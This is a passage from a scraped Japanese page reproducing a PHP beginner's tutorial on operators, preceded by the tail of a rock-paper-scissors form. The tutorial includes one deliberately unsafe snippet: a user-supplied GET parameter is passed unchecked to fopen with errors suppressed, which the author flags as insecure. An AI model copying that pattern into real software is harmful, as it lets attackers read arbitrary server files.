    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>じゃんけん<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">""</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"radio"</span> <span class="na">name</span><span class="o">=</span><span class="s">"you"</span> <span class="na">value</span><span class="o">=</span><span class="s">"0"</span> <span class="na">checked</span><span class="o">=</span><span class="s">"checked"</span> <span class="p">/&gt;</span>グー<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"radio"</span> <span class="na">name</span><span class="o">=</span><span class="s">"you"</span> <span class="na">value</span><span class="o">=</span><span class="s">"1"</span> <span class="p">/&gt;</span>チョキ<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"radio"</span> <span class="na">name</span><span class="o">=</span><span class="s">"you"</span> <span class="na">value</span><span class="o">=</span><span class="s">"2"</span> <span class="p">/&gt;</span>パー<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"radio"</span> <span class="na">name</span><span class="o">=</span><span class="s">"you"</span> <span class="na">value</span><span class="o">=</span><span class="s">"6"</span> <span class="p">/&gt;</span>皇帝<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"radio"</span> <span class="na">name</span><span class="o">=</span><span class="s">"you"</span> <span class="na">value</span><span class="o">=</span><span class="s">"3"</span> <span class="p">/&gt;</span>奴隷<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"勝負！"</span> <span class="p">/&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span><span class="o">:</span> <span class="cp">?&gt;</span>
    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>勝負！<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>
      あなた： <span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$hand_list</span><span class="p">[</span><span class="nv">$you</span><span class="p">]</span><span class="cp">?&gt;</span><span class="p">&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
      コンピュータ: <span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$hand_list</span><span class="p">[</span><span class="nv">$com</span><span class="p">]</span><span class="cp">?&gt;</span><span class="p">&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
      <span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$result_list</span><span class="p">[</span><span class="nv">$result</span><span class="p">]</span><span class="o">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="cp">?&gt;</span>
    <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span>
  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div></div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />48位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>18</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/1ea553fea092f597169a">【PHP入門講座】 演算子</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-12-02 21:22:24</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[PHP入門講座]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h3>
<span id="目次に戻る" class="fragment"></span><a href="#%E7%9B%AE%E6%AC%A1%E3%81%AB%E6%88%BB%E3%82%8B"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/752e19a578cf7d96fc5f" id="reference-63559ca9e31dbaa41ef0">目次に戻る</a>
</h3>

<p>今まで演算子 <code>+</code> や <code>=</code> などの説明をすっ飛ばしてきましたが、ここでようやく詳しく学習することになります。以下、演算子の<ins>優先度の高い順</ins>に紹介していきます。「優先度」とは、四則演算で言うならば乗除算が加減算より優先されるといったイメージです。</p>

<p>今回はボリュームぎっしりなので、一気に覚えようとはせずに徐々に触れながら覚えていく程度に思ってください。演算子絡みのよく分からない挙動・エラーに遭遇したらこのページに戻ってくればいいでしょう。</p>

<h1>
<span id="1-clone-new-最優先" class="fragment"></span><a href="#1-clone-new-%E6%9C%80%E5%84%AA%E5%85%88"><i class="fa fa-link"></i></a>1. <code>clone</code> <code>new</code> (最優先)</h1>

<p><strong>※ この項目には未学習の内容が含まれています。</strong></p>

<h2>
<span id="2-1-clone" class="fragment"></span><a href="#2-1-clone"><i class="fa fa-link"></i></a>2-1. <code>clone</code>
</h2>

<p>オブジェクトのクローンを生成して返します。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$b</span> <span class="o">=</span> <span class="k">clone</span> <span class="nv">$a</span><span class="p">;</span>
</pre></div></div>

<h2>
<span id="2-2-new" class="fragment"></span><a href="#2-2-new"><i class="fa fa-link"></i></a>2-2. <code>new</code>
</h2>

<p>オブジェクトのインスタンスを生成して返します。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">A</span><span class="p">();</span>
</pre></div></div>

<h1>
<span id="2-array--" class="fragment"></span><a href="#2-array--"><i class="fa fa-link"></i></a>2. <code>array()</code> <code>[ ]</code>
</h1>

<h2>
<span id="2-1-array" class="fragment"></span><a href="#2-1-array"><i class="fa fa-link"></i></a>2-1. <code>array()</code>
</h2>

<ul>
<li>配列を生成して返します。</li>
</ul>

<h2>
<span id="2-2--" class="fragment"></span><a href="#2-2--"><i class="fa fa-link"></i></a>2-2. <code>[ ]</code>
</h2>

<ul>
<li>配列を生成して返します。(PHP5.4以降)</li>
<li>配列のキーを指定します。</li>
</ul>

<h1>
<span id="3-------型" class="fragment"></span><a href="#3-------%E5%9E%8B"><i class="fa fa-link"></i></a>3. <code>++</code> <code>--</code> <code>~</code> <code>@</code> <code>(型)</code>
</h1>

<h2>
<span id="3-1-" class="fragment"></span><a href="#3-1-"><i class="fa fa-link"></i></a>3-1. <code>++</code>
</h2>

<p><strong>「インクリメント」</strong> と呼ばれます。 </p>

<h3>
<span id="3-1-1-数値" class="fragment"></span><a href="#3-1-1-%E6%95%B0%E5%80%A4"><i class="fa fa-link"></i></a>3-1-1. 数値</h3>

<p><ins>変数を</ins> <strong>+1</strong> する操作を行います。値に対しては使えません。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="nv">$j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="nv">$i</span> <span class="o">=</span> <span class="nv">$i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$i</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$j</span><span class="p">;</span>
<span class="nv">$j</span> <span class="o">=</span> <span class="nv">$j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</pre></div></div>

<p>これは下記のように簡略化することが出来ます。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="nv">$j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">echo</span> <span class="o">++</span><span class="nv">$i</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$j</span><span class="o">++</span><span class="p">;</span>
</pre></div></div>

<p><ins>前につけるのと後ろにつけるのでは解釈が異なる</ins>ので注意してください。</p>

<p><strong>前につけた場合</strong></p>

<ol>
<li>インクリメントが行われる</li>
<li>操作の <strong>後</strong> の値が返される</li>
</ol>

<p><strong>後ろにつけた場合</strong></p>

<ol>
<li>操作の <strong>前</strong> の値が返される</li>
<li>インクリメントが行われる</li>
</ol>

<h3>
<span id="3-1-2-true-false-配列-オブジェクト-リソース" class="fragment"></span><a href="#3-1-2-true-false-%E9%85%8D%E5%88%97-%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88-%E3%83%AA%E3%82%BD%E3%83%BC%E3%82%B9"><i class="fa fa-link"></i></a>3-1-2. <code>TRUE</code> <code>FALSE</code> 配列 オブジェクト リソース</h3>

<ins>何も起きません。</ins>

<h3>
<span id="3-1-3-null" class="fragment"></span><a href="#3-1-3-null"><i class="fa fa-link"></i></a>3-1-3. <code>NULL</code>
</h3>

<p><code>0</code> と見なされた後インクリメントされて <code>1</code> になります。</p>

<h3>
<span id="3-1-4-数字以外の文字列" class="fragment"></span><a href="#3-1-4-%E6%95%B0%E5%AD%97%E4%BB%A5%E5%A4%96%E3%81%AE%E6%96%87%E5%AD%97%E5%88%97"><i class="fa fa-link"></i></a>3-1-4. 数字以外の文字列</h3>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$s</span> <span class="o">=</span> <span class="s1">'X'</span><span class="p">;</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="nv">$a</span><span class="p">[]</span> <span class="o">=</span> <span class="o">++</span><span class="nv">$s</span><span class="p">;</span>
<span class="nv">$a</span><span class="p">[]</span> <span class="o">=</span> <span class="o">++</span><span class="nv">$s</span><span class="p">;</span>
<span class="nv">$a</span><span class="p">[]</span> <span class="o">=</span> <span class="o">++</span><span class="nv">$s</span><span class="p">;</span>
<span class="nv">$a</span><span class="p">[]</span> <span class="o">=</span> <span class="o">++</span><span class="nv">$s</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>array(4) {
  [0]=&gt;
  string(1) "Y"
  [1]=&gt;
  string(1) "Z"
  [2]=&gt;
  string(1) "AA"
  [3]=&gt;
  string(2) "AB"
}
</pre></div>
</div>

<h3>
<span id="3-1-5-数字とアルファベットで構成される文字列" class="fragment"></span><a href="#3-1-5-%E6%95%B0%E5%AD%97%E3%81%A8%E3%82%A2%E3%83%AB%E3%83%95%E3%82%A1%E3%83%99%E3%83%83%E3%83%88%E3%81%A7%E6%A7%8B%E6%88%90%E3%81%95%E3%82%8C%E3%82%8B%E6%96%87%E5%AD%97%E5%88%97"><i class="fa fa-link"></i></a>3-1-5. 数字とアルファベットで構成される文字列</h3>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$s</span> <span class="o">=</span> <span class="s1">'A8'</span><span class="p">;</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="nv">$a</span><span class="p">[]</span> <span class="o">=</span> <span class="o">++</span><span class="nv">$s</span><span class="p">;</span>
<span class="nv">$a</span><span class="p">[]</span> <span class="o">=</span> <span class="o">++</span><span class="nv">$s</span><span class="p">;</span>
<span class="nv">$a</span><span class="p">[]</span> <span class="o">=</span> <span class="o">++</span><span class="nv">$s</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>array(3) {
  [0]=&gt;
  string(2) "A9"
  [1]=&gt;
  string(2) "B0"
  [2]=&gt;
  string(2) "B1"
}
</pre></div>
</div>

<h3>
<span id="3-1-6-要注意-数値と-判断される-文字列" class="fragment"></span><a href="#3-1-6-%E8%A6%81%E6%B3%A8%E6%84%8F-%E6%95%B0%E5%80%A4%E3%81%A8-%E5%88%A4%E6%96%AD%E3%81%95%E3%82%8C%E3%82%8B-%E6%96%87%E5%AD%97%E5%88%97"><i class="fa fa-link"></i></a>3-1-6. 【要注意】 数値と "判断される" 文字列</h3>

<p>数値と判断された文字列はインクリメントされると、<ins>自動的に数値に変換されます</ins>。「浮動小数点数」の説明で <strong>科学記法</strong> について言及しましたが、実は文字列上でも該当してしまうので注意してください。この判断基準に関しては、 <strong>「緩やかな比較と厳密な比較」</strong> で詳しく学習します。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$s</span> <span class="o">=</span> <span class="s1">'01'</span><span class="p">;</span>
<span class="nv">$t</span> <span class="o">=</span> <span class="s1">'1D8'</span><span class="p">;</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="nv">$a</span><span class="p">[]</span> <span class="o">=</span> <span class="o">++</span><span class="nv">$s</span><span class="p">;</span>
<span class="nv">$a</span><span class="p">[]</span> <span class="o">=</span> <span class="o">++</span><span class="nv">$t</span><span class="p">;</span>
<span class="nv">$a</span><span class="p">[]</span> <span class="o">=</span> <span class="o">++</span><span class="nv">$t</span><span class="p">;</span>
<span class="nv">$a</span><span class="p">[]</span> <span class="o">=</span> <span class="o">++</span><span class="nv">$t</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>array(4) {
  [0]=&gt;
  int(2)
  [1]=&gt;
  string(3) "1D9"
  [2]=&gt;
  string(3) "1E0"
  [3]=&gt;
  float(2)
}
</pre></div>
</div>

<h2>
<span id="3-2---" class="fragment"></span><a href="#3-2---"><i class="fa fa-link"></i></a>3-2. <code>--</code>
</h2>

<p><strong>「デクリメント」</strong> と呼ばれます。</p>

<h3>
<span id="3-2-1-数値" class="fragment"></span><a href="#3-2-1-%E6%95%B0%E5%80%A4"><i class="fa fa-link"></i></a>3-2-1. 数値</h3>

<p><ins>変数を</ins> <strong>-1</strong> する操作を行います。値に対しては使えません。</p>

<h3>
<span id="3-2-2-true-false-null-配列-オブジェクト-リソース" class="fragment"></span><a href="#3-2-2-true-false-null-%E9%85%8D%E5%88%97-%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88-%E3%83%AA%E3%82%BD%E3%83%BC%E3%82%B9"><i class="fa fa-link"></i></a>3-2-2. <code>TRUE</code> <code>FALSE</code> <code>NULL</code> 配列 オブジェクト リソース</h3>

<p>何も起きません。こちらには <ins><code>NULL</code> も含まれている</ins>ことに注意してください。</p>

<h3>
<span id="3-2-3-数値と判断されない文字列" class="fragment"></span><a href="#3-2-3-%E6%95%B0%E5%80%A4%E3%81%A8%E5%88%A4%E6%96%AD%E3%81%95%E3%82%8C%E3%81%AA%E3%81%84%E6%96%87%E5%AD%97%E5%88%97"><i class="fa fa-link"></i></a>3-2-3. 数値と判断されない文字列</h3>

<p>何も起きません。</p>

<h3>
<span id="3-2-4-要注意-数値と判断される文字列" class="fragment"></span><a href="#3-2-4-%E8%A6%81%E6%B3%A8%E6%84%8F-%E6%95%B0%E5%80%A4%E3%81%A8%E5%88%A4%E6%96%AD%E3%81%95%E3%82%8C%E3%82%8B%E6%96%87%E5%AD%97%E5%88%97"><i class="fa fa-link"></i></a>3-2-4. 【要注意】 数値と判断される文字列</h3>

<p>自動的に数値に変換されます。</p>

<h2>
<span id="3-3-" class="fragment"></span><a href="#3-3-"><i class="fa fa-link"></i></a>3-3. <code>~</code>
</h2>

<p>ビット演算での <strong>否定</strong> を表します。</p>

<h3>
<span id="3-3-1-数値" class="fragment"></span><a href="#3-3-1-%E6%95%B0%E5%80%A4"><i class="fa fa-link"></i></a>3-3-1. 数値</h3>

<p>通常のビット反転が行われます。</p>

<h3>
<span id="3-3-2-文字列" class="fragment"></span><a href="#3-3-2-%E6%96%87%E5%AD%97%E5%88%97"><i class="fa fa-link"></i></a>3-3-2. 文字列</h3>

<p><ins>バイト単位</ins>でのビット反転が行われます。</p>

<h3>
<span id="3-3-3-それ以外" class="fragment"></span><a href="#3-3-3-%E3%81%9D%E3%82%8C%E4%BB%A5%E5%A4%96"><i class="fa fa-link"></i></a>3-3-3. それ以外</h3>

<p><strong>Fatal Error</strong> が発生します。</p>

<h2>
<span id="3-4-" class="fragment"></span><a href="#3-4-"><i class="fa fa-link"></i></a>3-4. <code>@</code>
</h2>

<p><strong>エラー制御演算子</strong> と呼ばれます。これをつけた部分とそれより内側で発生した全てのエラーを非表示にすることが出来ます。但し、<ins>処理速度が大幅に低下する</ins>のでこれに頼るのはやめましょう。以下に例を示します。このコードはセキュリティ的に問題があるので絶対に使わないでください。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">パラメータが未定義か配列である、またはファイルが存在しなかったとしてもエラーが発生しません</span></div>
<div class="highlight"><pre><span></span><span class="nv">$filename</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">];</span>
<span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">@演算子の効力は内側まで続くので、このように演算子1つでまとめることも出来ます</span></div>
<div class="highlight"><pre><span></span><span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">],</span> <span class="s1">'r'</span><span class="p">);</span>
</pre></div>
</div>

<p>上記はチェックをサボりまくった例ですが、関数の実装上やむを得ない場合もあるので一概に「使うな」とは言えません。</p>

<h2>
<span id="3-5-型" class="fragment"></span><a href="#3-5-%E5%9E%8B"><i class="fa fa-link"></i></a>3-5. <code>(型)</code>
</h2>

<p>強制的に型変換を実行する <strong>キャスト演算子</strong> です。</p>

<h1>
<span id="4-instanceof" class="fragment"></span><a href="#4-instanceof"><i class="fa fa-link"></i></a>4. <code>instanceof</code>
</h1>

<p><strong>※ この項目には未学習の内容が含まれています。</strong></p>

<p>あるオブジェクトがあるクラスのインスタンスかどうかを調べる演算子です。 <strong>型演算子</strong> と呼ばれます。論理値 <code>TRUE</code> <code>FALSE</code> のどちらかが返されます。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="k">stdClass</span><span class="p">;</span>
<span class="nv">$classname</span> <span class="o">=</span> <span class="s1">'stdClass'</span><span class="p">;</span>
<span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$obj</span> <span class="nx">instanceof</span> <span class="k">stdClass</span><span class="p">;</span>   <span class="c1">// TRUE</span>
<span class="nv">$v2</span> <span class="o">=</span> <span class="nv">$obj</span> <span class="nx">instanceof</span> <span class="nv">$classname</span><span class="p">;</span> <span class="c1">// TRUE</span>
<span class="nv">$v3</span> <span class="o">=</span> <span class="nv">$obj</span> <span class="nx">instanceof</span> <span class="s1">'stdClass'</span><span class="p">;</span> <span class="c1">// 文法エラー</span>
</pre></div></div>

<h1>
<span id="5-" class="fragment"></span><a href="#5-"><i class="fa fa-link"></i></a>5. <code>!</code>
</h1>

<p>値を<ins>論理型に変換した後</ins>、 <strong>否定(反転)</strong> したものを返します。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$v1</span> <span class="o">=</span> <span class="o">!</span><span class="mi">0</span><span class="p">;</span>    <span class="c1">// TRUE</span>
<span class="nv">$v2</span> <span class="o">=</span> <span class="o">!</span><span class="nv">$v1</span><span class="p">;</span>  <span class="c1">// FALSE</span>
<span class="nv">$v3</span> <span class="o">=</span> <span class="o">!!</span><span class="nv">$v1</span><span class="p">;</span> <span class="c1">// TRUE</span>
</pre></div></div>

<h1>
<span id="6---" class="fragment"></span><a href="#6---"><i class="fa fa-link"></i></a>6. <code>*</code> <code>/</code> <code>%</code>
</h1>

<h2>
<span id="6-1----" class="fragment"></span><a href="#6-1----"><i class="fa fa-link"></i></a>6-1.  <code>*</code> <code>/</code> <code>%</code>
</h2>

<p><strong>乗算</strong> と <strong>除算</strong> と <strong>剰余算</strong> を行います。結果の型は下記の条件に従います。</p>

<h4>
<span id="整数" class="fragment"></span><a href="#%E6%95%B4%E6%95%B0"><i class="fa fa-link"></i></a>整数</h4>

<ul>
<li>剰余算の場合は無条件で整数</li>
<li>乗算か除算の場合は2つの数が整数であるとき</li>
<li>且つ、除算の場合は割り切れるとき</li>
</ul>

<h4>
<span id="浮動小数点数" class="fragment"></span><a href="#%E6%B5%AE%E5%8B%95%E5%B0%8F%E6%95%B0%E7%82%B9%E6%95%B0"><i class="fa fa-link"></i></a>浮動小数点数</h4>

<ul>
<li>上記以外のとき</li>
</ul>

<p>但し、ゼロで割ると <strong>Warning</strong> が発生して <code>FALSE</code> になります。</p>

<h3>
<span id="6-1-1-数値" class="fragment"></span><a href="#6-1-1-%E6%95%B0%E5%80%A4"><i class="fa fa-link"></i></a>6-1-1. 数値</h3>

<p>通常の演算が行われます。</p>

<h3>
<span id="6-1-2-文字列-true-false-null-リソース" class="fragment"></span><a href="#6-1-2-%E6%96%87%E5%AD%97%E5%88%97-true-false-null-%E3%83%AA%E3%82%BD%E3%83%BC%E3%82%B9"><i class="fa fa-link"></i></a>6-1-2. 文字列 <code>TRUE</code> <code>FALSE</code> <code>NULL</code> リソース</h3>

<p>数値に変換されます。</p>

<h3>
<span id="6-1-3-配列-オブジェクト" class="fragment"></span><a href="#6-1-3-%E9%85%8D%E5%88%97-%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88"><i class="fa fa-link"></i></a>6-1-3. 配列 オブジェクト</h3>

<p><strong>Fatal Error</strong> が発生します。</p>

<h1>
<span id="7----" class="fragment"></span><a href="#7----"><i class="fa fa-link"></i></a>7. <code>+</code> <code>-</code> <code>.</code>
</h1>

<h2>
<span id="7-1----四則演算" class="fragment"></span><a href="#7-1----%E5%9B%9B%E5%89%87%E6%BC%94%E7%AE%97"><i class="fa fa-link"></i></a>7-1. <code>+</code> <code>-</code> (四則演算)</h2>

<p><strong>加算</strong> と <strong>減算</strong> を行います。結果の型は乗除算と同様の法則に従います。</p>

<h3>
<span id="7-1-1--文字列-true-false-null-リソース" class="fragment"></span><a href="#7-1-1--%E6%96%87%E5%AD%97%E5%88%97-true-false-null-%E3%83%AA%E3%82%BD%E3%83%BC%E3%82%B9"><i class="fa fa-link"></i></a>7-1-1.  文字列 <code>TRUE</code> <code>FALSE</code> <code>NULL</code> リソース</h3>

<p>数値に変換されます。</p>

<h3>
<span id="7-1-2-配列減算のみオブジェクト" class="fragment"></span><a href="#7-1-2-%E9%85%8D%E5%88%97%E6%B8%9B%E7%AE%97%E3%81%AE%E3%81%BF%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88"><i class="fa fa-link"></i></a>7-1-2. 配列(減算のみ)・オブジェクト</h3>

<p><strong>Fatal Error</strong> が発生します。</p>

<h2>
<span id="7-2--配列演算" class="fragment"></span><a href="#7-2--%E9%85%8D%E5%88%97%E6%BC%94%E7%AE%97"><i class="fa fa-link"></i></a>7-2. <code>+</code> (配列演算)</h2>

<h3>
<span id="要注意" class="fragment"></span><a href="#%E8%A6%81%E6%B3%A8%E6%84%8F"><i class="fa fa-link"></i></a>【要注意】</h3>

<p>これは、<ins>四則演算とは全く別の特別なもの</ins>として考えてください。</p>

<ul>
<li>どちらが一方でも配列でなければ <strong>Fatal Error</strong> を発生します。</li>
<li>2つの配列を<ins>キーはそのままにして</ins>結合します。</li>
<li>
<ins>先に存在していたキーが優先</ins>されます。</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span> <span class="o">=&gt;</span> <span class="s1">'A'</span><span class="p">,</span> <span class="mi">1</span> <span class="o">=&gt;</span> <span class="s1">'B'</span><span class="p">);</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">1</span> <span class="o">=&gt;</span> <span class="s1">'C'</span><span class="p">,</span> <span class="mi">2</span> <span class="o">=&gt;</span> <span class="s1">'D'</span><span class="p">);</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$a</span> <span class="o">+</span> <span class="nv">$b</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>array(3) {
  [0]=&gt;
  string(1) "A"
  [1]=&gt;
  string(1) "B"
  [2]=&gt;
  string(1) "D"
}
</pre></div>
</div>

<p>これは <code>array_merge</code> 関数とは全く異なる挙動であり、この違いを理解しておく必要があります。詳しくは後ほど。</p>

<h2>
<span id="7-3-" class="fragment"></span><a href="#7-3-"><i class="fa fa-link"></i></a>7-3. <code>.</code>
</h2>

<p><strong>文字列の結合</strong> を行います。 Javaなどのノリで <code>+</code> 演算子を使うと文字列の結合ではなく整数変換後の <strong>加算</strong> が行われてしまうので注意してください。PHPにおける演算子の正しい使い方を覚えましょう。</p>

<h3>
<span id="7-3-1-数値-true-false-null-リソース" class="fragment"></span><a href="#7-3-1-%E6%95%B0%E5%80%A4-true-false-null-%E3%83%AA%E3%82%BD%E3%83%BC%E3%82%B9"><i class="fa fa-link"></i></a>7-3-1. 数値 <code>TRUE</code> <code>FALSE</code> <code>NULL</code> リソース</h3>

<p>文字列に変換されます。</p>

<h3>
<span id="7-3-1-配列" class="fragment"></span><a href="#7-3-1-%E9%85%8D%E5%88%97"><i class="fa fa-link"></i></a>7-3-1. 配列</h3>

<p><code>"Array"</code> に変換されますが、 <strong>Notice</strong> を発生します。</p>

<h3>
<span id="7-3-2-オブジェクト" class="fragment"></span><a href="#7-3-2-%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88"><i class="fa fa-link"></i></a>7-3-2. オブジェクト</h3>

<p><strong>※ この項目には未学習の内容が含まれています。</strong></p>

<ul>
<li>マジックメソッド <code>__toString</code> が実装されている場合、その返り値となります。</li>
<li>実装されていない場合は <strong>Catchable Fatal Error</strong> が発生します。</li>
</ul>

<h2>
<span id="7-4-よくあるミス" class="fragment"></span><a href="#7-4-%E3%82%88%E3%81%8F%E3%81%82%E3%82%8B%E3%83%9F%E3%82%B9"><i class="fa fa-link"></i></a>7-4. よくあるミス</h2>

<p><code>+</code> <code>-</code> <code>.</code> の優先度は等しく、左から順に評価されていくので、下記のコードは意図したとおりに動きません。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="k">echo</span> <span class="s1">'one plus three equals '</span> <span class="o">.</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">.</span> <span class="s1">' !!'</span><span class="p">;</span> 
</pre></div>
</div>

<p><code>'one plus three equals 1'</code> という文字列に <code>3</code> が足される演算が行われてしまい、この文字列を整数に変換すると <code>0</code> になってしまうため、下記のような結果になります。</p>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>3 !!
</pre></div>
</div>

<p>これを避けたければ、</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">echo</span> <span class="s1">'one plus three equals '</span> <span class="o">.</span> <span class="p">(</span><span class="mi">1</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> <span class="o">.</span> <span class="s1">' !!'</span><span class="p">;</span> 
</pre></div></div>

